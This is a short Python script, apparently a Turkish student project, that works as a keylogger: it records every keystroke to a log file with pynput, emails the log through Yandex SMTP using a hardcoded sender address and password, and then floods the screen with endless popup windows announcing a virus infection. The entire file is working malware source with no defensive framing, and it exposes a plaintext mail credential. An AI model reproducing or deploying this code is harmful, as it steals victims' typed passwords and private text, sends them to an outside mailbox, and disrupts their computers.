import pynput
import smtplib
import random
from tkinter import *
from random import randint
import time
import threading


from pynput.keyboard import Key,Listener

count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print("{0} basıldı".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        subject= "Mail başlığı"
        sender= "projedeneme280@yandex.com"
        to= "projedeneme95@yandex.com"
        password= "hhbowuiacbnyfopu"
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = to
        with open ("log.txt", "r", encoding="utf-8") as file:
            data = file.read()
        text = MIMEText(data, "plain")
        msg.attach(text)


        s = smtplib.SMTP("smtp.yandex.com",587)
        s.ehlo()
        s.starttls()
        s.login(sender,password)
        try:
            s.send_message(msg)
        except:
            print("Mail gönderilemedi")
        s.quit()

        root = Tk()
        root.attributes("-alpha", 0)
        root.overrideredirect(1)
        root.attributes("-topmost", 1)

        def placewindows():
            while True:
                win = Toplevel(root)
                win.geometry("300x60+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0, root.winfo_screenheight() - 60)))
                win.overrideredirect(1)
                Label(win, text="Tebrikler, virüs kaptınız!", fg="red").place(relx=.38, rely=.3)
                win.lift()
                win.attributes("-topmost", True)
                win.attributes("-topmost", False)
                root.lift()
                root.attributes("-topmost", True)
                root.attributes("-topmost", False)
                time.sleep(.05)

        threading.Thread(target=placewindows).start()

        root.mainloop()

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()